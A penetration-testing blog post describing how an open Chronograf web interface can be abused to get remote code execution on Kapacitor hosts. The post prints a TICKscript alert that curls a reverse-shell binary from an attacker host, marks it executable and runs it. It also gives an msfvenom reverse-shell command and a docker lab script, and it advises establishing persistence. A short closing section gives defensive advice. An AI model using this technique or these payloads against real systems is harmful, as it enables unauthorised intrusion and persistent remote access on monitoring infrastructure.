---
layout: post
title:  "TICK Stack: Getting Kapacitor Shells via Chronograf"
toc: true
date:   2020-06-17
categories: network-pentest
---

# Motivation 

Depending on the devops culture of the teams you're consulting with, you may come across the [TICK stack](https://www.influxdata.com/time-series-platform/) during an engagement. The TICK stack is a set of tools which makes metrics collection, system monitoring, and alerting easy for deployments. It's also yet another set of tools which ships with no authentication by the default.

If you find an open Chronograf instance (default listening port is 8888), you may be able to abuse it to gain code execution on a related stack component (Kapacitor). The execution may happen on the Chronograf host itself, or a network-connected Kapacitor host, depending on the configuration.

# Prerequisites

You've found an open Chronograf instance (no-auth by default), or you've obtained credentials to one. 

At the time of writing this technique works against the latest Chronograph/Kapacitor versions.

# Exploiting

Depending on what you have access to in the network, Kapacitor has an [HTTP API](https://docs.influxdata.com/kapacitor/v1.5/working/api/), which we could use to script this attack directly (port 9092 is the default if you're looking for Kapacitor instances), though in this post I'll show how to get a shell via the Chronograf gui.

Once in the Chronograph web ui, click on the 'Alerts -> Manage Alerts' page in the left navigation bar

![](/screens/kapacitor-chronograf-view.png)

From here, you can create a new 'TICKscript'

![](/screens/kapacitor-write-tickscript.png)

... paste in an appropriate [payload](/downloadable/kapacitor-tickscript):

![](/screens/kapacitor-select-db-and-save.png)

choose a database and save the script. This [example payload](/dowloadable/kapacitor-tickscript) operates against the built-in `_internal` database, and should execute the code if there are more than 0 measurements in the database.

The key section of the [script](/downloadable/kapacitor-tickscript) is the alert which executes code on the host (here, curling out to the attacker on 172.21.0.1:

```
var trigger = data
    |alert()
        .crit(lambda: "value" > crit)
        .message(message)
        .id(idVar)
        .idTag(idTag)
        .levelTag(levelTag)
        .messageField(messageField)
        .durationField(durationField)
        .exec('curl', '172.21.0.1/reverse-shell', '-o', '/tmp/reverse-shell')
        .exec('chmod', '+x', '/tmp/reverse-shell')
        .exec('/tmp/reverse-shell')

```

Once the script has been saved the alert becomes active and will execute every 10 seconds (under the default config). I'd recommend getting a shell, establishing persistence, and then removing the malicious alert.

![](/screens/kapacitor-payload-executes.png)

# Try it out 

The following should work on a UNIX system with docker and `jq` installed.

Run this bash script to kick off a simulated influx-kapacitor-chronograf setup:

```bash
# saved as start.sh in examples
netcheck=`docker network list | grep influxdb`

if [ -z "$netcheck" ]; then
	echo "creating influxdb docker network"
	docker network create influxdb
fi

# generate a default kapacitor config
docker run --rm kapacitor  kapacitord config > kapacitor.conf

# start influx db on the influxdb network
docker run --rm --net=influxdb -d --name=influxdb influxdb

# start up kapacitor
docker run -d -p 9092:9092 \
    --rm \
    --name=kapacitor \
    --net=influxdb \
    -e KAPACITOR_INFLUXDB_0_URLS_0=http://influxdb:8086 \
    kapacitor

# chronograph (ui) pointed at right endpoints
docker run --rm -d -p 8888:8888 \
      --net=influxdb \
      --name=chronograf \
      chronograf --influxdb-url=http://influxdb:8086 --kapacitor-url=http://kapacitor:9092


echo "setup finished. Network is laid out as"
docker network inspect influxdb | jq '.[].Containers[] | .Name + ": " + .IPv4Address'
```
![](/screens/kapacitor-network-start.png)


Generate a reverse shell with msfvenom changing IPs as necessary:

```bash
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=172.21.0.1 LPORT=9999 -f elf -o reverse-shell
```

Set up a quick web server for the chronograf instance to grab the reverse-shell binary.

Navigate to the chronograf endpoint and run the attack steps (remember to sub in the correct IP in the TICKscript).



# If You're Defending

The usual advice applies here - don't let developers run administrative services on your network without authentication required (or if they REALLY must, try to firewall off the access as much as you can).

